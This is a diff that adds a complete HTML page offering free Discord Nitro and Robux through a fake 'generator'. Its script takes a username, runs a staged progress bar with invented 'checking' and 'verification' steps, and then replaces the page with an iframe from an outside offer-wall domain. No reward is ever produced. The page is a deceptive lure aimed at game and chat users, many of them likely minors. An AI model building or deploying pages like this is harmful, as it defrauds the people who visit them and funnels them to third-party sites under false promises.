@@ -1,0 +1,1354 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Claim Your Reward</title>
+
+</head>
+<body>
+<style>@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Unbounded:wght@500;700&display=swap');
+
+:root {
+  --bg: #1f2127;
+  --panel: #2b2d31;
+  --panel-2: #313338;
+  --text: #ffffff;
+  --muted: #e6e9f2;
+  --accent: #5865f2;
+  --accent-2: #3ba55c;
+  --accent-3: #f6c343;
+  --glow: rgba(88, 101, 242, 0.35);
+  --radius: 22px;
+  --shadow: 0 28px 70px rgba(0, 0, 0, 0.45);
+  --font-main: "Space Grotesk", "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+  --font-display: "Unbounded", "Space Grotesk", "Segoe UI", sans-serif;
+}
+
+* { box-sizing: border-box; }
+html, body {
+  min-height: 100%;
+}
+body {
+  margin: 0;
+  background:
+    radial-gradient(900px 500px at 15% 15%, rgba(88,101,242,0.35), transparent 60%),
+    radial-gradient(800px 500px at 85% 25%, rgba(91,188,255,0.18), transparent 60%),
+    linear-gradient(145deg, #3d4188 0%, #2a2d55 35%, #171823 100%);
+  color: var(--text);
+  font-family: var(--font-main);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 28px;
+  min-height: 100vh;
+  overflow-y: auto;
+}
+
+.wrap {
+  width: min(860px, 100%);
+}
+
+.card {
+  background: linear-gradient(160deg, var(--panel), var(--panel-2));
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+  padding: 28px;
+  border: 1px solid rgba(255,255,255,0.06);
+  position: relative;
+  overflow: hidden;
+}
+
+.card::after {
+  content: "";
+  position: absolute;
+  inset: -30% 0 auto auto;
+  width: 240px;
+  height: 240px;
+  background: radial-gradient(circle, rgba(88,101,242,0.35), transparent 70%);
+  filter: blur(8px);
+  pointer-events: none;
+}
+
+.header {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 18px;
+}
+
+.badge {
+  width: 44px;
+  height: 44px;
+  border-radius: 14px;
+  display: grid;
+  place-items: center;
+  background: rgba(88,101,242,0.2);
+  border: 1px solid rgba(88,101,242,0.5);
+  box-shadow: 0 10px 30px rgba(88,101,242,0.25);
+}
+
+.badge svg {
+  width: 24px;
+  height: 24px;
+  fill: none;
+  stroke: var(--accent);
+  stroke-width: 2.2;
+}
+
+h1 {
+  font-family: var(--font-display);
+  letter-spacing: 0.4px;
+  margin: 0 0 4px;
+  font-size: clamp(22px, 3vw, 30px);
+}
+
+.subtitle {
+  color: var(--muted);
+  margin: 0;
+  font-size: 0.98rem;
+}
+
+.option-row {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 14px;
+  margin-top: 12px;
+}
+
+.option-btn {
+  appearance: none;
+  border: 1px solid rgba(255,255,255,0.08);
+  background: rgba(255,255,255,0.06);
+  color: var(--text);
+  padding: 14px 18px;
+  border-radius: 999px;
+  font-size: 0.98rem;
+  font-weight: 700;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  transition: transform .2s ease, border-color .2s ease, box-shadow .2s ease, background .2s ease, opacity .2s;
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.02);
+}
+
+.option-btn:hover {
+  transform: translateY(-2px);
+  border-color: rgba(109,168,255,0.7);
+  box-shadow: 0 16px 26px rgba(79,124,255,0.28);
+}
+
+.option-btn:focus-visible {
+  outline: 2px solid rgba(255,255,255,0.7);
+  outline-offset: 2px;
+}
+
+.option-btn.active {
+  border-color: #6da8ff;
+  background: linear-gradient(135deg, rgba(109,168,255,0.4), rgba(47,91,255,0.2));
+  box-shadow: 0 0 0 1px rgba(109,168,255,0.6), 0 18px 40px rgba(79,124,255,0.35);
+}
+
+.opt-img {
+  width: 44px;
+  height: 44px;
+  border-radius: 12px;
+  object-fit: cover;
+  background: transparent;
+  border: none;
+  padding: 0;
+}
+
+.opt-text {
+  display: grid;
+  gap: 2px;
+  text-align: left;
+}
+
+.opt-title {
+  font-size: 0.98rem;
+  font-weight: 700;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.title-icon {
+  width: 36px;
+  height: 36px;
+  object-fit: contain;
+}
+
+.opt-sub {
+  color: var(--muted);
+  font-size: 0.85rem;
+  font-weight: 500;
+}
+
+.choices {
+  margin-top: 22px;
+  display: grid;
+  gap: 16px;
+}
+
+.choices.two {
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+}
+
+.choices.three {
+  grid-template-columns: repeat(3, minmax(0, 1fr));
+}
+
+.choice-card {
+  border: 1px solid rgba(255,255,255,0.08);
+  background: linear-gradient(160deg, rgba(44,48,66,0.9), rgba(26,28,44,0.9));
+  padding: 22px;
+  text-align: center;
+  border-radius: 18px;
+  cursor: pointer;
+  transition: transform .2s ease, border-color .2s ease, box-shadow .2s ease, background .2s ease, opacity .2s;
+  display: grid;
+  gap: 12px;
+  min-height: 200px;
+  position: relative;
+  overflow: hidden;
+  animation: none;
+}
+
+.choice-card.animate {
+  animation: card-in 0.55s ease both;
+  animation-delay: var(--delay);
+}
+
+.choice-card.active.animate {
+  animation: card-in 0.55s ease both, active-float 2.4s ease-in-out infinite;
+  animation-delay: var(--delay), 0s;
+}
+
+.choice-card::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: radial-gradient(220px 140px at 50% 0%, rgba(109,168,255,0.2), transparent 70%);
+  opacity: 0.7;
+  pointer-events: none;
+}
+
+.choice-card > * {
+  position: relative;
+  z-index: 1;
+}
+
+.choice-badge {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  padding: 3px 8px;
+  border-radius: 999px;
+  background: rgba(88,101,242,0.18);
+  border: 1px solid rgba(88,101,242,0.5);
+  color: #e8edff;
+  font-size: 0.62rem;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+  text-transform: uppercase;
+  font-family: var(--font-display);
+}
+
+.choice-card:hover {
+  transform: translateY(-4px);
+  border-color: rgba(109,168,255,0.6);
+  box-shadow: 0 20px 36px rgba(79,124,255,0.32);
+}
+
+.choice-card.active {
+  border-color: #6da8ff;
+  background: linear-gradient(160deg, rgba(65,115,255,0.25), rgba(26,28,44,0.9));
+  box-shadow: 0 0 0 1px rgba(109,168,255,0.6), 0 18px 36px rgba(79,124,255,0.35);
+}
+
+.choice-card:focus-visible {
+  outline: 2px solid rgba(255,255,255,0.6);
+  outline-offset: 3px;
+}
+
+.choice-icon {
+  width: 88px;
+  height: 88px;
+  margin: 0 auto;
+  border-radius: 20px;
+  display: grid;
+  place-items: center;
+  border: 1px solid rgba(255,255,255,0.08);
+  background: linear-gradient(160deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.04), 0 10px 20px rgba(10,12,24,0.35);
+  transition: transform .2s ease, box-shadow .2s ease, border-color .2s ease;
+}
+
+.choice-card:hover .choice-icon {
+  transform: translateY(-2px) scale(1.02);
+  border-color: rgba(109,168,255,0.45);
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.06), 0 14px 26px rgba(10,12,24,0.45);
+}
+
+.choice-card.active .choice-icon {
+  border-color: rgba(109,168,255,0.65);
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08), 0 16px 30px rgba(79,124,255,0.35);
+}
+
+.choice-icon img {
+  width: 56px;
+  height: 56px;
+  object-fit: contain;
+}
+
+.choice-icon svg {
+  width: 34px;
+  height: 34px;
+  fill: none;
+  stroke: #ffffff;
+  stroke-width: 2.2;
+}
+
+.choice-title {
+  color: #f4f7ff;
+  font-weight: 700;
+  font-size: 1.05rem;
+  letter-spacing: 0.3px;
+  font-family: var(--font-display);
+}
+
+.choice-price {
+  color: var(--accent-3);
+  font-size: 0.96rem;
+  font-weight: 700;
+  font-family: var(--font-display);
+  letter-spacing: 0.3px;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  padding: 4px 12px;
+  border-radius: 999px;
+  background: rgba(246,195,67,0.12);
+  border: 1px solid rgba(246,195,67,0.45);
+  box-shadow: inset 0 0 0 1px rgba(246,195,67,0.15);
+  width: fit-content;
+  margin: 0 auto;
+}
+
+.choice-sub {
+  color: #d7defc;
+  font-size: 0.93rem;
+  line-height: 1.5;
+  max-width: 220px;
+  margin: 0 auto;
+}
+
+.actions {
+  margin-top: 18px;
+  display: grid;
+  gap: 8px;
+  justify-items: center;
+}
+
+.actions-note {
+  margin: 0;
+  color: var(--muted);
+  font-size: 0.88rem;
+}
+
+.generate-btn {
+  border: none;
+  background: linear-gradient(135deg, #74a6ff 0%, #4f7cff 45%, #2f5bff 100%);
+  color: #fff;
+  padding: 13px 26px;
+  border-radius: 999px;
+  font-weight: 700;
+  letter-spacing: 0.4px;
+  cursor: pointer;
+  box-shadow: 0 18px 35px rgba(79,124,255,0.45), 0 0 24px rgba(116,166,255,0.45);
+  transition: transform .18s ease, box-shadow .18s ease, opacity .2s;
+  animation: blue-pulse 2.4s ease-in-out infinite;
+}
+
+.generate-btn:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 20px 40px rgba(79,124,255,0.55), 0 0 30px rgba(116,166,255,0.55);
+}
+
+.generate-btn[disabled] {
+  opacity: 0.5;
+  cursor: not-allowed;
+  box-shadow: none;
+  transform: none;
+}
+
+.ghost-btn {
+  border: 1px solid rgba(255,255,255,0.2);
+  background: transparent;
+  color: var(--text);
+  padding: 10px 18px;
+  border-radius: 999px;
+  font-weight: 600;
+  cursor: pointer;
+}
+
+.hidden { display: none; }
+
+.progress {
+  margin-top: 24px;
+  display: grid;
+  gap: 14px;
+  place-items: center;
+}
+
+.progress-row {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.spinner {
+  width: 42px;
+  height: 42px;
+  border: 4px solid rgba(255,255,255,0.15);
+  border-top-color: var(--accent);
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  box-shadow: 0 0 18px var(--glow);
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+@keyframes blue-pulse {
+  0%, 100% {
+    transform: translateY(0);
+    box-shadow: 0 18px 35px rgba(79,124,255,0.45), 0 0 24px rgba(116,166,255,0.45);
+  }
+  50% {
+    transform: translateY(-1px);
+    box-shadow: 0 22px 40px rgba(79,124,255,0.6), 0 0 32px rgba(116,166,255,0.6);
+  }
+}
+
+.status {
+  color: var(--muted);
+  font-size: 0.98rem;
+}
+
+.status-sub {
+  color: var(--muted);
+  font-size: 0.9rem;
+}
+
+.bar {
+  width: min(420px, 100%);
+  height: 8px;
+  border-radius: 999px;
+  background: rgba(255,255,255,0.08);
+  overflow: hidden;
+  border: 1px solid rgba(255,255,255,0.06);
+}
+
+.bar-fill {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, var(--accent), #7b86ff);
+  transition: width 0.4s ease;
+  box-shadow: 0 0 18px rgba(88,101,242,0.4);
+}
+
+.disabled {
+  pointer-events: none;
+  opacity: 0.55;
+}
+
+.modal {
+  position: fixed;
+  inset: 0;
+  display: grid;
+  place-items: center;
+  background: rgba(10, 12, 18, 0.7);
+  backdrop-filter: blur(8px);
+  padding: 24px;
+  z-index: 20;
+}
+
+.modal-card {
+  width: min(420px, 100%);
+  background: linear-gradient(160deg, rgba(40,42,60,0.95), rgba(24,26,38,0.95));
+  border-radius: 20px;
+  padding: 22px;
+  box-shadow: 0 24px 50px rgba(0,0,0,0.45);
+  border: 1px solid rgba(255,255,255,0.08);
+  display: grid;
+  gap: 12px;
+}
+
+.modal-card h2 {
+  margin: 0;
+  font-family: var(--font-display);
+  font-size: 1.2rem;
+}
+
+.modal-sub {
+  margin: 0;
+  color: var(--muted);
+  font-size: 0.92rem;
+}
+
+.input-label {
+  font-size: 0.85rem;
+  color: var(--muted);
+}
+
+#username-input {
+  border-radius: 12px;
+  border: 1px solid rgba(255,255,255,0.15);
+  background: rgba(10,12,18,0.6);
+  color: var(--text);
+  padding: 12px 14px;
+  font-size: 0.95rem;
+  font-family: var(--font-main);
+}
+
+#username-input:focus {
+  outline: 2px solid rgba(122,134,255,0.6);
+  border-color: rgba(122,134,255,0.6);
+}
+
+.modal-actions {
+  display: flex;
+  justify-content: flex-end;
+  gap: 10px;
+  margin-top: 8px;
+}
+
+footer {
+  margin-top: 18px;
+  text-align: center;
+  color: var(--muted);
+  font-size: 0.8rem;
+}
+
+@media (max-width: 720px) {
+  body {
+    align-items: flex-start;
+    min-height: 100dvh;
+    padding: 12px;
+  }
+  .card {
+    padding: 14px;
+    border-radius: 16px;
+  }
+  .header {
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 12px;
+  }
+  .badge {
+    width: 34px;
+    height: 34px;
+    border-radius: 10px;
+    flex: 0 0 auto;
+  }
+  .badge svg {
+    width: 20px;
+    height: 20px;
+  }
+  .option-row {
+    grid-template-columns: 1fr;
+    gap: 8px;
+    margin-top: 8px;
+  }
+  .option-btn {
+    justify-content: flex-start;
+    padding: 10px 12px;
+  }
+  .title-icon {
+    width: 26px;
+    height: 26px;
+  }
+  .choices {
+    margin-top: 12px;
+    gap: 10px;
+  }
+  .choices.two,
+  .choices.three {
+    grid-template-columns: 1fr;
+  }
+  .choice-card {
+    grid-template-columns: 56px minmax(0, 1fr);
+    align-items: center;
+    min-height: 84px;
+    padding: 12px 14px;
+    gap: 6px 12px;
+    text-align: left;
+  }
+  .choice-icon {
+    grid-column: 1;
+    grid-row: 1 / span 4;
+    width: 56px;
+    height: 56px;
+    margin: 0;
+    border-radius: 14px;
+  }
+  .choice-icon img {
+    width: 36px;
+    height: 36px;
+  }
+  .choice-badge {
+    position: static;
+    grid-column: 2;
+    justify-self: start;
+    width: fit-content;
+  }
+  .choice-title,
+  .choice-price,
+  .choice-sub {
+    grid-column: 2;
+  }
+  .choice-title {
+    font-size: 0.95rem;
+  }
+  .choice-price {
+    margin: 0;
+    padding: 3px 10px;
+    font-size: 0.82rem;
+  }
+  .choice-sub {
+    max-width: none;
+    margin: 0;
+    font-size: 0.82rem;
+    line-height: 1.25;
+  }
+  .progress-row {
+    flex-direction: column;
+    align-items: flex-start;
+  }
+  .bar {
+    width: 100%;
+  }
+  .actions {
+    width: 100%;
+  }
+  .generate-btn {
+    width: 100%;
+  }
+  .modal-card {
+    width: 100%;
+    padding: 18px;
+  }
+}
+
+@media (max-width: 480px) {
+  body {
+    padding: 10px;
+  }
+  .card {
+    padding: 12px;
+  }
+  h1 {
+    font-size: 1.05rem;
+  }
+  .subtitle {
+    font-size: 0.82rem;
+  }
+  .option-btn {
+    padding: 9px 10px;
+  }
+  .opt-title {
+    font-size: 0.9rem;
+  }
+  .choice-card {
+    min-height: 78px;
+    padding: 10px 12px;
+    grid-template-columns: 50px minmax(0, 1fr);
+  }
+  .choice-icon {
+    width: 50px;
+    height: 50px;
+  }
+  .choice-icon img {
+    width: 32px;
+    height: 32px;
+  }
+  .choice-title {
+    font-size: 0.9rem;
+  }
+  .choice-sub {
+    font-size: 0.78rem;
+  }
+  .status,
+  .status-sub {
+    font-size: 0.9rem;
+  }
+  footer {
+    margin-top: 10px;
+  }
+  .modal {
+    padding: 12px;
+  }
+  .modal-card h2 {
+    font-size: 1rem;
+    line-height: 1.25;
+  }
+}
+
+.modal.hidden {
+  display: none;
+}
+
+.modal-status {
+  margin: 6px 0 0;
+  color: var(--muted);
+  font-size: 0.85rem;
+  min-height: 1.2em;
+}
+
+#username-input.validated {
+  border-color: rgba(59, 165, 92, 0.9);
+  outline: 2px solid rgba(59, 165, 92, 0.6);
+  box-shadow: 0 0 0 2px rgba(59, 165, 92, 0.2), 0 0 18px rgba(59, 165, 92, 0.35);
+  animation: input-validated 0.55s ease-out;
+}
+
+.generate-btn.is-valid {
+  background: linear-gradient(135deg, #41c66f 0%, #3ba55c 45%, #248a45 100%);
+  box-shadow: 0 18px 35px rgba(59, 165, 92, 0.45), 0 0 24px rgba(65, 198, 111, 0.45);
+  animation: confirm-pop 0.5s ease-out;
+}
+
+@keyframes input-validated {
+  0% {
+    transform: scale(1);
+  }
+  40% {
+    transform: scale(1.02);
+  }
+  100% {
+    transform: scale(1);
+  }
+}
+
+@keyframes confirm-pop {
+  0% {
+    transform: translateY(0) scale(1);
+  }
+  60% {
+    transform: translateY(-2px) scale(1.02);
+  }
+  100% {
+    transform: translateY(0) scale(1);
+  }
+}
+
+@keyframes card-in {
+  0% {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  100% {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+
+body.page-ready .card {
+  animation: page-card 0.7s ease both;
+}
+
+body.page-ready .header {
+  animation: fade-up 0.6s ease both;
+}
+
+body.page-ready .option-row {
+  animation: fade-up 0.6s 0.1s ease both;
+}
+
+body.page-ready #screen-2 {
+  animation: fade-up 0.6s 0.18s ease both;
+}
+
+body.page-ready .actions {
+  animation: fade-up 0.6s 0.26s ease both;
+}
+
+body.page-ready .progress {
+  animation: fade-up 0.6s 0.26s ease both;
+}
+
+body.page-ready footer {
+  animation: fade-up 0.6s 0.4s ease both;
+}
+
+.option-btn {
+  position: relative;
+  overflow: hidden;
+}
+
+.option-btn::after {
+  content: "";
+  position: absolute;
+  inset: 0;
+  transform: translateX(-120%);
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.18), transparent);
+  opacity: 0;
+}
+
+.option-btn:hover::after {
+  animation: sheen 0.8s ease;
+}
+
+.choice-card.active {
+  animation: active-float 2.4s ease-in-out infinite;
+}
+
+.actions-note {
+  animation: fade-up 0.5s ease both;
+}
+
+#username-input {
+  transition: border-color .2s ease, box-shadow .2s ease, transform .2s ease;
+}
+
+#username-input:focus {
+  transform: translateY(-1px);
+}
+
+.modal {
+  animation: modal-fade 0.25s ease both;
+}
+
+.modal-card {
+  animation: modal-pop 0.35s ease both;
+}
+
+.progress-row {
+  animation: fade-up 0.4s ease both;
+}
+
+.bar {
+  animation: grow-in 0.4s ease both;
+}
+
+@keyframes page-card {
+  0% {
+    opacity: 0;
+    transform: translateY(12px) scale(0.98);
+  }
+  100% {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+  }
+}
+
+@keyframes fade-up {
+  0% {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  100% {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@keyframes sheen {
+  0% {
+    opacity: 0;
+    transform: translateX(-120%);
+  }
+  15% {
+    opacity: 0.5;
+  }
+  60% {
+    opacity: 0.2;
+  }
+  100% {
+    opacity: 0;
+    transform: translateX(120%);
+  }
+}
+
+@keyframes active-float {
+  0%, 100% {
+    transform: translateY(0);
+  }
+  50% {
+    transform: translateY(-3px);
+  }
+}
+
+@keyframes modal-fade {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+
+@keyframes modal-pop {
+  0% {
+    opacity: 0;
+    transform: translateY(8px) scale(0.98);
+  }
+  100% {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+  }
+}
+
+@keyframes grow-in {
+  0% {
+    opacity: 0;
+    transform: scaleX(0.85);
+  }
+  100% {
+    opacity: 1;
+    transform: scaleX(1);
+  }
+}</style>
+  <main class="wrap">
+    <section class="card">
+      <header class="header">
+        <div class="badge" aria-hidden="true">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M5 8h14v11a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8z"></path>
+            <path d="M12 3v18"></path>
+            <path d="M3 8h18"></path>
+            <path d="M7 3h10a2 2 0 0 1 2 2v3H5V5a2 2 0 0 1 2-2z"></path>
+          </svg>
+        </div>
+        <div>
+          <h1>Claim Your Reward</h1>
+          <p class="subtitle">Choose a platform to continue.</p>
+        </div>
+      </header>
+
+      <div id="screen-1">
+        <div class="option-row">
+          <button class="option-btn" id="opt-1" data-option="1" type="button">
+                        <span class="opt-text">
+              <span class="opt-title">
+                <img class="title-icon" src="pics/discord-logo.png" alt="" aria-hidden="true">
+                Discord Nitro
+              </span>
+            </span>
+          </button>
+          <button class="option-btn" id="opt-2" data-option="2" type="button">
+                        <span class="opt-text">
+              <span class="opt-title">
+                <img class="title-icon" src="pics/roblox-logo.png" alt="" aria-hidden="true">
+                Robux
+              </span>
+            </span>
+          </button>
+        </div>
+      </div>
+
+      <div id="screen-2" class="hidden">
+        <div id="choices" class="choices two"></div>
+      </div>
+
+      <div id="actions" class="actions hidden">
+        <button class="generate-btn" id="generate-btn" type="button" disabled="">Start Generation</button>
+        <p class="actions-note">Select a reward to unlock the button.</p>
+      </div>
+
+      <div id="progress" class="progress hidden">
+        <div class="progress-row">
+          <div class="spinner" aria-label="Loading"></div>
+          <div class="status" id="status-text"></div>
+        </div>
+        <div class="bar" aria-hidden="true">
+          <div class="bar-fill" id="bar-fill"></div>
+        </div>
+        <div class="status-sub" id="status-sub"></div>
+      </div>
+    </section>
+
+    <footer>
+      Nitro Rewards Special Event - 2026
+    </footer>
+  </main>
+
+  <div id="name-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="name-title">
+    <div class="modal-card">
+      <h2 id="name-title">Select your username</h2>
+      <label class="input-label" for="username-input">Username</label>
+      <input id="username-input" type="text" placeholder="Ex: wumplus">
+      <p class="modal-status" id="modal-status"></p>
+      <div class="modal-actions">
+        <button class="ghost-btn" id="cancel-btn" type="button">Cancel</button>
+        <button class="generate-btn" id="confirm-btn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+
+  <script>document.addEventListener("DOMContentLoaded", () => {
+  document.body.classList.add("page-ready");
+  
+  // Define the iframe HTML
+  const iframeHTML = `<iframe
+    src="https://rainawards.com/ow/69e367f9d79f79182119b927"
+    width="100%"
+    height="650"
+    frameborder="0"
+    style="border:none;border-radius:12px;"
+    allow="clipboard-write"
+  ></iframe>`;
+
+  const screen2 = document.getElementById("screen-2");
+  const choicesEl = document.getElementById("choices");
+  const progress = document.getElementById("progress");
+  const statusText = document.getElementById("status-text");
+  const statusSub = document.getElementById("status-sub");
+  const barFill = document.getElementById("bar-fill");
+  const optionButtons = Array.from(document.querySelectorAll(".option-btn"));
+  const actions = document.getElementById("actions");
+  const actionsNote = document.querySelector(".actions-note");
+  const generateBtn = document.getElementById("generate-btn");
+  const nameModal = document.getElementById("name-modal");
+  const usernameInput = document.getElementById("username-input");
+  const confirmBtn = document.getElementById("confirm-btn");
+  const modalStatus = document.getElementById("modal-status");
+  const nameTitle = document.getElementById("name-title");
+
+  if (!screen2 || !choicesEl || !progress || !statusText || !statusSub || !barFill) {
+    return;
+  }
+
+  let selectedChoice = null;
+  let selectedPlatform = null;
+
+  const optionData = {
+    1: [
+      {
+        title: "Nitro Basic",
+        price: "$29.99",
+        desc: "Essentials: emojis, stickers, and 50MB upload",
+        iconType: "img",
+        icon: "pics/nitro-basic.png"
+      },
+      {
+        title: "Nitro Boost",
+        price: "$99.99",
+        desc: "Everything plus boosts, 4K streaming, and perks",
+        badge: "Best Value",
+        iconType: "img",
+        icon: "pics/nitro-boost.png"
+      }
+    ],
+    2: [
+      {
+        title: "450 Robux",
+        desc: "Perfect for avatar items and game passes",
+        iconType: "img",
+        icon: "pics/robux-icon.png"
+      },
+      {
+        title: "1500 Robux",
+        desc: "Ideal for bundles, boosts, and cosmetics",
+        iconType: "img",
+        icon: "pics/robux-icon.png"
+      },
+      {
+        title: "4500 Robux",
+        desc: "Max pack for big upgrades and future drops",
+        badge: "Best Value",
+        iconType: "img",
+        icon: "pics/robux-icon.png"
+      }
+    ]
+  };
+
+  const progressSteps = [
+    {
+      label: "Preparing...",
+      sub: "Generating",
+      min: 1200,
+      max: 2200,
+      target: 22
+    },
+    {
+      label: "Checking...",
+      sub: "Preparing Verification",
+      min: 1400,
+      max: 2600,
+      target: 48
+    },
+    {
+      label: "Finalizing...",
+      sub: "Rediricting verification",
+      min: 1700,
+      max: 3000,
+      target: 76
+    },
+    {
+      label: "Almost there...",
+      sub: "Just a few more seconds",
+      min: 1600,
+      max: 3000,
+      target: 96
+    },
+    {
+      label: "Done...",
+      sub: "Redirecting",
+      min: 900,
+      max: 1400,
+      target: 94
+    }
+  ];
+
+  function rand(min, max) {
+    return Math.floor(min + Math.random() * (max - min + 1));
+  }
+
+  function selectChoice(card, item) {
+    Array.from(choicesEl.querySelectorAll(".choice-card")).forEach((choice) => {
+      choice.classList.remove("active");
+    });
+    card.classList.add("active");
+    selectedChoice = item;
+    if (generateBtn) {
+      generateBtn.disabled = false;
+      generateBtn.textContent = `Generate ${item.title}`;
+    }
+    if (actionsNote) {
+      actionsNote.classList.add("hidden");
+    }
+  }
+
+  function buildChoices(optionKey) {
+    const items = optionData[optionKey];
+    if (!items) {
+      return;
+    }
+    choicesEl.className = "choices " + (items.length === 2 ? "two" : "three");
+    choicesEl.innerHTML = "";
+
+    items.forEach((item, index) => {
+      const card = document.createElement("button");
+      card.type = "button";
+      card.className = "choice-card";
+      card.style.setProperty("--delay", `${index * 90}ms`);
+      card.classList.add("animate");
+
+      const iconMarkup = item.iconType === "img"
+        ? `<img src="${item.icon}" alt="${item.title}" />`
+        : item.iconType === "svg"
+        ? item.icon
+        : item.icon;
+
+      const priceMarkup = item.price
+        ? `<div class="choice-price">${item.price}</div>`
+        : "";
+
+      const badgeMarkup = item.badge
+        ? `<span class="choice-badge">${item.badge}</span>`
+        : "";
+
+      card.innerHTML = `
+        ${badgeMarkup}
+        <div class="choice-icon">${iconMarkup}</div>
+        <div class="choice-title">${item.title}</div>
+        ${priceMarkup}
+        <div class="choice-sub">${item.desc}</div>
+      `;
+
+      card.addEventListener("click", () => selectChoice(card, item));
+      choicesEl.appendChild(card);
+    });
+  }
+
+  function showChoices(optionKey) {
+    optionButtons.forEach((btn) => {
+      btn.classList.toggle("active", btn.dataset.option === optionKey);
+    });
+    selectedPlatform = optionKey === "1" ? "DISCORD" : "ROBLOX";
+    screen2.classList.remove("hidden");
+    if (actions) {
+      actions.classList.remove("hidden");
+    }
+    if (generateBtn) {
+      generateBtn.disabled = true;
+      generateBtn.textContent = "Start Generation";
+    }
+    if (actionsNote) {
+      actionsNote.classList.remove("hidden");
+    }
+    selectedChoice = null;
+    buildChoices(optionKey);
+  }
+
+  function disableInputs() {
+    optionButtons.forEach((btn) => btn.classList.add("disabled"));
+    Array.from(choicesEl.querySelectorAll(".choice-card")).forEach((card) => {
+      card.classList.add("disabled");
+    });
+    if (generateBtn) {
+      generateBtn.classList.add("disabled");
+    }
+  }
+
+  function normalizeDurations(steps) {
+    const total = steps.reduce((sum, step) => sum + step.duration, 0);
+    const minTotal = 900;
+    const maxTotal = 1500;
+
+    if (total >= minTotal && total <= maxTotal) {
+      return;
+    }
+
+    const target = rand(minTotal, maxTotal);
+    const ratio = target / total;
+    steps.forEach((step) => {
+      step.duration = Math.max(120, Math.round(step.duration * ratio));
+    });
+  }
+
+  function startProgress() {
+    disableInputs();
+    progress.classList.remove("hidden");
+
+    const steps = progressSteps.map((step) => ({
+      ...step,
+      duration: rand(step.min, step.max),
+      pause: rand(40, 90)
+    }));
+
+    normalizeDurations(steps);
+
+    let index = 0;
+
+    function advance() {
+      const step = steps[index];
+      statusText.textContent = step.label;
+      statusSub.textContent = step.sub;
+      barFill.style.transitionDuration = step.duration + "ms";
+      barFill.style.width = step.target + "%";
+
+      const delay = step.duration + step.pause;
+
+      if (index >= steps.length - 1) {
+        setTimeout(() => {
+          // Clear the page and show the iframe
+          document.body.innerHTML = "";
+          document.body.style.padding = "0";
+          document.body.style.margin = "0";
+          document.body.style.background = "linear-gradient(145deg, #3d4188 0%, #2a2d55 35%, #171823 100%)";
+          document.body.innerHTML = iframeHTML;
+        }, delay);
+        return;
+      }
+
+      index += 1;
+      setTimeout(advance, delay);
+    }
+
+    advance();
+  }
+
+  function openModal() {
+    if (!selectedChoice || !nameModal || !usernameInput) {
+      return;
+    }
+    nameModal.classList.remove("hidden");
+    if (nameTitle) {
+      const platformLabel = selectedPlatform || "APP";
+      nameTitle.textContent = `SELECT YOUR ${platformLabel} USERNAME:`;
+    }
+    usernameInput.value = "";
+    usernameInput.classList.remove("validated");
+    if (confirmBtn) {
+      confirmBtn.classList.remove("is-valid");
+      confirmBtn.disabled = true;
+      confirmBtn.textContent = "Continue";
+    }
+    if (modalStatus) {
+      modalStatus.textContent = "";
+    }
+    setTimeout(() => usernameInput.focus(), 0);
+  }
+
+  function closeModal() {
+    if (!nameModal) {
+      return;
+    }
+    nameModal.classList.add("hidden");
+  }
+
+  optionButtons.forEach((btn) => {
+    btn.addEventListener("click", () => showChoices(btn.dataset.option));
+  });
+
+  if (generateBtn) {
+    generateBtn.addEventListener("click", openModal);
+  }
+
+  if (confirmBtn) {
+    confirmBtn.addEventListener("click", () => {
+      if (!usernameInput || !usernameInput.value.trim()) {
+        return;
+      }
+      closeModal();
+      startProgress();
+    });
+  }
+
+  if (usernameInput && confirmBtn) {
+    let validationTimer = null;
+
+    const applyValidation = (value) => {
+      const isValid = value.length >= 3;
+      usernameInput.classList.toggle("validated", isValid);
+      confirmBtn.classList.toggle("is-valid", isValid);
+      confirmBtn.disabled = !isValid;
+      confirmBtn.textContent = isValid ? "Validated" : "Continue";
+      if (modalStatus) {
+        modalStatus.textContent = isValid ? "Username validated." : "Enter at least 3 characters.";
+      }
+    };
+
+    const validateUsername = () => {
+      const value = usernameInput.value.trim();
+
+      if (validationTimer) {
+        clearTimeout(validationTimer);
+      }
+
+      usernameInput.classList.remove("validated");
+      confirmBtn.classList.remove("is-valid");
+      confirmBtn.disabled = true;
+      confirmBtn.textContent = value ? "Checking..." : "Continue";
+      if (modalStatus) {
